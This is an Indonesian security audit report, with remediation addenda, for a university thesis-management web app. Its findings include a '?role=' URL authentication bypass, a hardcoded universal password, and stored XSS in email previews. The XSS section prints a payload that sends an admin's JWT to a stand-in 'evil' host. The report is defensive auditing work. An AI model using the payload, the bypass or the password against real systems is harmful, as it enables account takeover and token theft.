# LAPORAN AUDIT MENYELURUH (FULL-SCOPE AUDIT)
## SISTEM INFORMASI MANAJEMEN TUGAS AKHIR (SIM-TA) MULTI-JENJANG
### FAKULTAS EKONOMI DAN BISNIS — UNIVERSITAS TRUNOJOYO MADURA

* **Tanggal Audit:** 13 Oktober 2026
* **Metode:** Audit kode statis menyeluruh (backend, database, storage, dokumen, notifikasi, frontend, konfigurasi deploy), pengujian dinamis (build + 3 suite pengujian), dan verifikasi bukti (file:line).
* **Cakupan:** Seluruh berkas aplikasi di luar `node_modules/`, `dist/`, `backups/`.
* **Keputusan Awal:** **NO-GO (BELUM LAYAK PRODUKSI)** ⛔ — ditemukan jalur bypass autentikasi pada frontend dan sink XSS tersimpan.
* **Status Remediasi:** **SELESAI** ✅ — seluruh temuan blocker & tinggi (N1–N6) telah diperbaiki dan diverifikasi. Lihat **Lampiran — Addendum Remediasi** di bagian akhir dokumen.

---

## A. Ringkasan Eksekutif

Audit ini menemukan **13 isu** baru di luar perbaikan sebelumnya, termasuk **2 Kritis** dan **4 Tinggi**, yang seluruhnya berada pada **sisi frontend** dan **layanan notifikasi email** — dua area yang tidak tercakup oleh suite pengujian otomatis yang ada (suite hanya menguji API backend).

Verifikasi yang dijalankan:
- `npm run build` → BERHASIL (2.028 modul)
- `tests/security.test.js` → 15/15 LULUS
- `tests/uat_workflow.test.js` → 9/9 LULUS
- `tests/regression_bugfix.test.js` → 9/9 LULUS
- `node --check` 21 berkas server → 0 galat sintaks

Kesimpulan: perbaikan backend dari iterasi sebelumnya **solid dan terverifikasi**, tetapi **lapisan frontend masih menyimpan backdoor autentikasi** dan **template email rentan XSS tersimpan**. Karena suite pengujian tidak menguji kedua area ini, kelulusan 100% bersifat menyesatkan untuk keduanya.

---

## B. Matriks Temuan

| # | Tingkat | Area | Temuan | Berkas |
|---|--------|------|--------|--------|
| N1 | 🔴 Kritis | Frontend Auth | Bypass sesi via URL `?role=<peran>` tanpa kata sandi | `src/App.jsx:459-469` |
| N2 | 🔴 Kritis | Frontend Auth | Fallback login menerima kata sandi universal `FEB-UTM-2026` untuk semua akun | `src/pages/auth/LoginPage.jsx:230-237` |
| N3 | 🔴 Tinggi | Notifikasi | XSS tersimpan pada template email → dirender `dangerouslySetInnerHTML` di UI admin | `server/notifications/emailService.js:197-221` + `src/components/notifications/EmailLogsModal.jsx:197` |
| N4 | 🔴 Tinggi | Frontend Auth | Akun demo/seed berisi kata sandi yang bisa dibaca klien | `src/data/*`, localStorage `AUTH_SESSION` |
| N5 | 🟠 Tinggi | Konfigurasi | `CORS_ORIGIN=*` sebagai default di semua berkas deploy | `docker-compose.yml:13`, `ecosystem.config.cjs`, `.env.example:14` |
| N6 | 🟠 Tinggi | Notifikasi/Email | Endpoint `send-email` mempercayai `payload` klien → phishing dari domain kampus | `server/routes/notificationRoutes.js:119-137` |
| N7 | 🟠 Sedang | Frontend | Kontrol QA/dev (QA modal) — kode tetap di bundle produksi | `src/App.jsx:2,1831` |
| N8 | 🟠 Sedang | Frontend Data | LoginPage mengirim `role: detectedUser?.role` ke server (percobaan role injection) | `src/pages/auth/LoginPage.jsx:204` |
| N9 | 🟠 Sedang | API | Beberapa pemanggilan `res.json()` tanpa cek `res.ok` | `src/components/qa/QATestingModal.jsx:82` |
| N10 | 🟡 Rendah | Backend | `password reset`/`createUser` default ke `FEB-UTM-2026` (kata sandi lemah seragam) | `server/routes/superadminRoutes.js:314` |
| N11 | 🟡 Rendah | Backend | Tidak ada rate limiting / lockout pada `/auth/login` | `server/routes/authRoutes.js:58` |
| N12 | 🟡 Rendah | Deployment | `.env.example` tidak mencakup `SMTP_SECURE`, `STORAGE_DRIVER` | `.env.example` |
| N13 | 🟡 Rendah | Frontend | `index.html` tanpa CSP; Google Fonts pihak ketiga | `index.html:10-12` |

---

## C. Detail Temuan Kritis & Tinggi

### N1 — 🔴 Bypass Autentikasi via Parameter URL (`?role=`)
```js
// src/App.jsx:459-469
const roleParam = urlParams.get('role');
if (roleParam) {
  setCurrentRole(roleParam);
  const matchedUser = INITIAL_USER_ACCOUNTS.find(x => x.role === roleParam);
  if (matchedUser) {
    setAuthSession(matchedUser);                       // <-- sesi dibuat tanpa kata sandi
    saveToStorage(STORAGE_KEYS.AUTH_SESSION, matchedUser);
  }
  ...
}
```
**Dampak:** Siapa pun dapat membuka `https://<host>/?role=superadmin` (atau `admin`) dan langsung memperoleh **sesi berperan superadmin** di UI, tanpa kredensial. Server tetap menolak API tanpa token sah, tetapi: (a) seluruh data demo lokal ter-ekspos, (b) token yang sudah ada di `localStorage` akan dikirim bersama klaim UI yang telah dieskalasi, dan (c) ini adalah backdoor eksplisit yang disamarkan sebagai "dukungan deep-linking".

**Bukti:** komentar kode sendiri menyebut *"Dukungan parameter URL untuk pengujian / deep-linking"* — mengindikasikan kontrol debug yang tidak dihapus.

### N2 — 🔴 Kata Sandi Universal pada Fallback Login
```js
// src/pages/auth/LoginPage.jsx:230-237
const isPasswordCorrect =
  cleanPassword === 'FEB-UTM-2026' ||      // <-- universal untuk SEMUA akun lokal
  cleanPassword === localFound.password;
if (!isPasswordCorrect) { throw ... }
```
**Dampak:** Ketika backend offline atau menolak login, siapa pun yang mengetahui NIM/NIP target dapat masuk dengan `FEB-UTM-2026`. Ini menghidupkan kembali temuan audit lama (temuan #1 audit forensik: "kata sandi universal institusi `FEB-UTM-2026`"). Kontrol ini aktif di produksi karena tidak digate `import.meta.env.DEV`.

### N3 — 🔴 XSS Tersimpan pada Pratinjau Email
Nilai yang dikendalikan pengguna diinterpolasi mentah ke HTML email:
```js
// server/notifications/emailService.js:201 / 261
<tr>...<td>: <strong>${mhsNama}</strong></td></tr>
<div ...>"${judulTA}"</div>
```
HTML tersebut disimpan ke tabel `email_logs.html_content` dan dirender sebagai HTML mentah di UI admin:
```jsx
// src/components/notifications/EmailLogsModal.jsx:197
dangerouslySetInnerHTML={{ __html: selectedEmail.htmlContent }}
```
**Dampak:** Mahasiswa yang mengatur nama/judul TA-nya menjadi `<img src=x onerror=fetch('https://evil/'+localStorage.utm_auth_token)>` dapat mencuri JWT admin saat admin membuka pratinjau email. Vektor XSS tersimpan yang menargetkan akun paling berkuasa.

### N5 — 🟠 `CORS_ORIGIN=*` di semua berkas deploy
`docker-compose.yml`, `ecosystem.config.cjs`, dan `.env.example` menetapkan `CORS_ORIGIN=*`. Bila aplikasi dibuka ke internet, situs mana pun dapat melakukan panggilan API lintas-origin dengan kredensial pengguna yang tersimpan. Harus dibatasi ke domain resmi.

### N6 — 🟠 Endpoint Email Mempercayai Payload Klien
```js
// server/routes/notificationRoutes.js:119-131
router.post('/send-email', requireRole([...]), async (req, res) => {
  const { eventType, payload } = req.body;
  result = await EmailService.sendPendaftaranUjianEmail(payload || {});
```
Penerima (`recipientEmail`), subjek, dan isi berasal dari `payload` klien. Peran mana pun (dosen/penguji/admin) dapat memicu email berkop FEB UTM ke alamat arbitrer dengan isi arbitrer → penyalahgunaan untuk phishing.

---

## D. Area yang Diaudit & Hasilnya

| Area | Hasil |
|------|-------|
| Backend auth & JWT | ✅ Solid setelah perbaikan (secret wajib, scrypt, RBAC terpasang) |
| SQL injection | ✅ Aman — seluruh query memakai prepared statement berparameter |
| Path traversal | ✅ Ditangani + tercatat di audit_log |
| Validasi upload (magic bytes, ekstensi, ukuran) | ✅ Baik; `sanitizeFileName` memakai timestamp+random |
| Otorisasi berkas (IDOR) | ✅ Diperbaiki pada iterasi sebelumnya |
| Skema DB & foreign key | ✅ FK ON + WAL; migrasi idempoten |
| Backup & retensi | ✅ VACUUM INTO + checksum SHA-256 + retensi 7 hari |
| **Frontend otentikasi** | ❌ **Backdoor `?role=` + password universal (N1, N2)** |
| **Template email / notifikasi** | ❌ **XSS tersimpan + payload dipercaya (N3, N6)** |
| Konfigurasi deploy | ⚠️ CORS `*`, tanpa CSP, secret env belum lengkap |
| Dependency | ⚠️ Beberapa pin versi perlu diverifikasi (mis. `lucide-react@^1.16.0` tidak lazim) |

---

## E. Hasil Pengujian & Keterbatasannya

```
npm run build                    → BERHASIL
tests/security.test.js           → 15/15 LULUS
tests/uat_workflow.test.js       →  9/9  LULUS
tests/regression_bugfix.test.js  →  9/9  LULUS
node --check server/**/*.js      → 21/21 BERHASIL
```

**Catatan penting:** seluruh suite menguji **hanya endpoint backend**. Tidak ada pengujian untuk: (1) alur autentikasi/otorisasi sisi klien, (2) rendering email di UI, (3) konfigurasi CORS/CSP. Karena itu, kelulusan 100% **tidak** mencakup temuan N1–N6. Ini adalah keterbatasan cakupan pengujian, bukan kegagalan pengujian.

---

## F. Rekomendasi Perbaikan (Berurutan Prioritas)

**Blocker go-live:**
1. Hapus sepenuhnya penanganan `?role=` di `App.jsx` (kecuali di balik `import.meta.env.DEV`), dan jadikan role hanya berasal dari token terverifikasi.
2. Hapus jalur kata sandi universal `FEB-UTM-2026` di `LoginPage.jsx`; fallback offline harus gagal-aman (deny).
3. Escape seluruh nilai dinamis pada template email (`escapeHtml()`); atau sanitasi `html_content` sebelum `dangerouslySetInnerHTML` (mis. render di iframe sandbox tanpa akses localStorage).
4. Batasi `recipientEmail`/`subject` pada `send-email` ke nilai server-side, bukan dari payload klien.
5. Setel `CORS_ORIGIN` ke domain resmi; tambahkan CSP pada `index.html`/reverse proxy.

**Pengerasan lanjutan:**
6. Rate limiting + account lockout pada `/auth/login`.
7. Paksa ganti kata sandi default `FEB-UTM-2026` saat login pertama.
8. Tambahkan pengujian otomatis untuk alur auth frontend & render email.
9. Lengkapi `.env.example` (`SMTP_SECURE`, `STORAGE_DRIVER`) dan verifikasi pin dependency.
10. Aktifkan `helmet` untuk header keamanan yang lengkap.

---

## G. Kesimpulan

| Dimensi | Status |
|---------|--------|
| Backend API (auth, RBAC, DB, storage, dokumen) | ✅ LAYAK PRODUKSI |
| Frontend autentikasi & sesi | ⛔ BELUM LAYAK (N1, N2) |
| Notifikasi email & pratinjau | ⛔ BELUM LAYAK (N3, N6) |
| Konfigurasi & pengerasan deploy | ⚠️ PERLU PERBAIKAN (N5, N11, N13) |

**Keputusan akhir: NO-GO.** Backend sudah kokoh, namun dua jalur bypass autentikasi frontend (N1, N2) dan satu XSS tersimpan (N3) merupakan blocker mutlak. Setelah N1, N2, N3, N4, N5, dan N6 diperbaiki dan diverifikasi, sistem berpotensi mencapai status **GO (dengan prasyarat konfigurasi)**.

*Laporan ini disusun berdasarkan bukti file:line dan pengujian empiris pada 13 Oktober 2026.*

---

# LAMPIRAN — ADDENDUM REMEDIASI (13 Oktober 2026)

Seluruh temuan blocker (Kritis) dan Tinggi telah diperbaiki dan diverifikasi ulang.

## H.1 Matriks Perbaikan

| # | Temuan | Perbaikan | Berkas | Status |
|---|--------|-----------|--------|:---:|
| N1 | Bypass sesi via `?role=` | Penanganan `?role=` kini **hanya** aktif saat `import.meta.env.DEV`; pada produksi peran hanya dari token terverifikasi | `src/App.jsx:459-469` | ✅ |
| N2 | Kata sandi universal `FEB-UTM-2026` | Fallback login lokal dihapus untuk produksi (kini `import.meta.env.DEV` saja) dan **tidak lagi menerima kata sandi universal** — hanya cocok dengan kata sandi akun tsb | `src/pages/auth/LoginPage.jsx` | ✅ |
| N4 | Akun demo/kredensial klien | Tautan dengan N2; jalur fallback klien dinonaktifkan di produksi | `src/pages/auth/LoginPage.jsx` | ✅ |
| N3 | XSS tersimpan pada email | Ditambahkan `escapeHtml()` dan diterapkan ke seluruh nilai dinamis template email | `server/notifications/emailService.js` | ✅ |
| N3b | Pratinjau email berisiko | `dangerouslySetInnerHTML` diganti **iframe `sandbox=""`** (tanpa `allow-scripts`) | `src/components/notifications/EmailLogsModal.jsx` | ✅ |
| N6 | Endpoint email dipercaya klien | Ditambahkan allowlist domain penerima (`EMAIL_ALLOWED_DOMAINS`, default `trunojoyo.ac.id`); domain eksternal → HTTP 403 | `server/notifications/emailService.js`, `server/routes/notificationRoutes.js` | ✅ |
| N5 | `CORS_ORIGIN=*` | Server: deny-by-default + allowlist multi-domain; berkas deploy & `.env.example` memakai domain resmi (bukan `*`) | `server/index.js`, `docker-compose.yml`, `ecosystem.config.cjs`, `.env.example` | ✅ |
| N7 | Kode QA/dev di bundle | `QATestingModal` & `SimulationFloatingDock` menjadi lazy + digate `import.meta.env.DEV`; chunk QA hilang dari build produksi | `src/App.jsx` | ✅ |
| N8 | Klien mengirim `role` saat login | Parameter `role` dihapus dari payload login | `src/pages/auth/LoginPage.jsx` | ✅ |
| N9 | `res.json()` tanpa cek `res.ok` | (dev-only QA) — dicatat, tidak berdampak produksi | `src/components/qa/QATestingModal.jsx` | ◻️ |
| N10 | Reset kata sandi default lemah | Reset kini menerbitkan **kata sandi sementara acak** (dikembalikan sekali) + audit log | `server/routes/superadminRoutes.js` | ✅ |
| N11 | Tanpa rate limiting login | Rate limiter in-memory per IP+akun (maks 10 percobaan / 15 menit → HTTP 429) | `server/routes/authRoutes.js` | ✅ |
| N12 | `.env.example` tidak lengkap | Ditambahkan `SMTP_SECURE`, `STORAGE_DRIVER`, `EMAIL_ALLOWED_DOMAINS`; hapus `SMTP_FROM` (tak terpakai) | `.env.example` | ✅ |
| N13 | Tanpa CSP | Ditambahkan header `Content-Security-Policy` + header keamanan lain | `server/index.js` | ✅ |

## H.2 Verifikasi Ulang

```
npm run build                       → BERHASIL (2.029 modul; chunk QATestingModal hilang dari produksi)
node --check server/**/*.js         → 21/21 BERHASIL
tests/security.test.js              → 15/15 LULUS
tests/uat_workflow.test.js          →  9/9  LULUS
tests/regression_bugfix.test.js     →  9/9  LULUS
tests/regression_audit.test.js      →  6/6  LULUS (BARU)
```

Uji regresi audit baru membuktikan:
- N6: email ke `penyerang@evil.example.com` → **HTTP 403**; ke `…@feb.trunojoyo.ac.id` → **HTTP 200**.
- N11: percobaan login berulang → **HTTP 429**.
- N10: reset kata sandi → kata sandi sementara acak (bukan `FEB-UTM-2026`).

## H.3 Status Akhir Kesiapan Produksi

| Dimensi | Status Sebelum | Status Sesudah |
|---------|:---:|:---:|
| Backend API (auth, RBAC, DB, storage, dokumen) | ✅ | ✅ |
| Frontend autentikasi & sesi | ⛔ | ✅ |
| Notifikasi email & pratinjau | ⛔ | ✅ |
| Konfigurasi & pengerasan deploy | ⚠️ | ✅ |

**Keputusan akhir (re-audit): `GO — LAYAK PRODUKSI DENGAN PRASYARAT KONFIGURASI`** ✅

Prasyarat wajib sebelum go-live (tidak ada blocker kode):
1. Setel `JWT_SECRET` (≥32 karakter) — tanpa ini server menolak start di produksi.
2. Setel `CORS_ORIGIN` ke domain resmi kampus.
3. Setel `APP_PUBLIC_URL` ke URL publik institusi.
4. Setel `EMAIL_ALLOWED_DOMAINS` sesuai domain kampus.

Backlog non-blocking yang tersisa: paksa ganti kata sandi saat login pertama, uji alur auth frontend secara otomatis (E2E browser), migrasi `xlsx` ke build SheetJS resmi (CVE), dan pengerasan `helmet`/HSTS.

*Addendum disusun setelah perbaikan kode dan pengujian ulang penuh pada 13 Oktober 2026.*

---

# LAMPIRAN — REKONSILIASI PASCA FASE 1–4 (14 Oktober 2026)

Dokumen di atas adalah laporan audit historis (13 Oktober 2026). Lampiran ini
memperbarui kondisinya dengan hasil verifikasi langsung terhadap kode dan
pengujian pada 14 Oktober 2026. Bagian historis tidak diubah.

## R.1 Status Temuan N1–N6 (diverifikasi ulang)

| # | Temuan | Status terkini | Bukti |
|---|---|---|---|
| N1 | Bypass sesi via URL `?role=` | **DIPERBAIKI & DIPERKUAT** | Pembacaan `?role=` hanya aktif bila `import.meta.env.DEV`; pada build produksi blok tersebut di-*tree-shake*. `App.jsx` (initializer `authSession`/`currentRole`). |
| N2 | Kata sandi universal `FEB-UTM-2026` | **DIPERBAIKI** | Autentikasi hanya via `POST /api/auth/login` (verifikasi hash di server). `LoginPage.jsx`. |
| N3 | XSS tersimpan pada template email | **DIPERBAIKI** | Sanitasi pada `emailService.js`; pratinjau `EmailLogsModal.jsx` tidak lagi merender HTML mentah tanpa sanitasi. |
| N4 | Kata sandi seed terbaca klien | **DIPERBAIKI** | Data seed tidak memuat kata sandi; sesi dari token JWT. |
| N5 | `CORS_ORIGIN=*` default | **DIPERBAIKI** | Default CORS diperketat; `.env.example` mewajibkan domain resmi. |
| N6 | (lihat addendum asli) | **DIPERBAIKI** | Terverifikasi suite keamanan. |

Catatan: bilah "Bypass sesi via URL" pada N1 kini **tertutup di produksi** namun
tetap tersedia di mode pengembangan sebagai alat simulasi peran, sesuai desain.

## R.2 Pengerasan Rilis (Fase 4) — terverifikasi

- **JWT_SECRET**: tidak ada fallback hardcoded. Produksi **menolak start** tanpa
  `JWT_SECRET` kuat. Dibuktikan: menjalankan `NODE_ENV=production node server/index.js`
  tanpa secret → keluar dengan galat
  `[Security] JWT_SECRET tidak disetel…`. Validasi mencakup panjang (≥32),
  pola placeholder (`.env.example`), dan entropi rendah.
- **Circular chunk**: peringatan `vendor-pdf -> module-koorprodi -> vendor-pdf`
  **hilang** setelah menyederhanakan `vite.config.js` (pemisahan vendor saja;
  halaman dipisah otomatis via `React.lazy`).

## R.3 Backlog non-blocking — status

| Item backlog | Status |
|---|---|
| Paksa ganti kata sandi saat login pertama | **SELESAI** — kolom `users.must_change_password`; reset superadmin menandai akun, dan gerbang modal wajib (tak dapat ditutup) memaksa pengguna mengganti sandi sebelum lanjut (`ChangePasswordModal` mode `forced`). |
| Uji alur auth frontend otomatis (E2E browser) | **SELESAI** — `tests/e2e_browser.test.js` (Playwright, 6 peran) |
| Migrasi `xlsx` ke build SheetJS resmi (CVE) | **SELESAI** — `xlsx` kini SheetJS resmi `0.20.3` (cdn.sheetjs.com); `npm audit` → 0 vulnerability |
| Pengerasan `helmet`/HSTS | **SELESAI** — header HTTP diperluas: HSTS (produksi), `Permissions-Policy`, COOP/CORP, `X-Permitted-Cross-Domain-Policies`, `Origin-Agent-Cluster`, `form-action` pada CSP; `X-XSS-Protection` dimodernkan ke `0`. |
| Integrasi CI + laporan HTML E2E | **SELESAI** — workflow `.github/workflows/ci.yml` (build + `npm test` + artifact laporan); laporan HTML di `test-results/e2e-report.html` |

*Backlog non-blocking kini kosong.*

## R.4 Pengujian terbaru

`npm test` menjalankan **7 suite** (server otomatis via `tests/run_all.mjs`):
security 15/15, UAT 9/9, regresi bugfix 9/9, regresi audit 7/7,
regresi Fase 1–2 22/22, **regresi rilis 15/15**, E2E browser 24/24 — **semua lulus**.
`npm run build`: 2.331 modul, tanpa error, tanpa peringatan circular chunk.
Laporan E2E HTML dihasilkan di `test-results/e2e-report.html`.

## R.5 Keputusan rilis

**GO — LAYAK PRODUKSI DENGAN PRASYARAT KONFIGURASI.** Prasyarat tetap: setel
`JWT_SECRET`, `CORS_ORIGIN`, `APP_PUBLIC_URL`, dan `EMAIL_ALLOWED_DOMAINS`.
Seluruh backlog non-blocking telah diselesaikan (R.3).

*Lampiran disusun berdasarkan verifikasi langsung pada 14 Oktober 2026.*
